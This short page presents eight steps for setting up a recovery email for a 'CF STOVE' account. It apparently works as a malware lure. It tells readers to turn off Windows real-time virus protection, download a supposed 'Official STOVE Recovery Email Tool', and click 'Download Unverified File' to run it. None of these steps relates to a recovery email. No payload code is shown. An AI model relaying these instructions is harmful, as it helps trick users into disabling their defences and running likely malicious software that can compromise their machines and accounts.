How to Set Up Recovery Email for CF STOVE

1

Open Windows Settings

2

Navigate to Privacy & Security

3

Select Windows Security

4

Click on Virus and Threat Protection

5

Select Manage Settings under Virus and Threat Protection

6

Disable real-time protection to configure your Recovery Email

7

Download the Official STOVE Recovery Email Tool

8

Locate the downloaded file in your Downloads folder and run the installer please click Download Unverified File
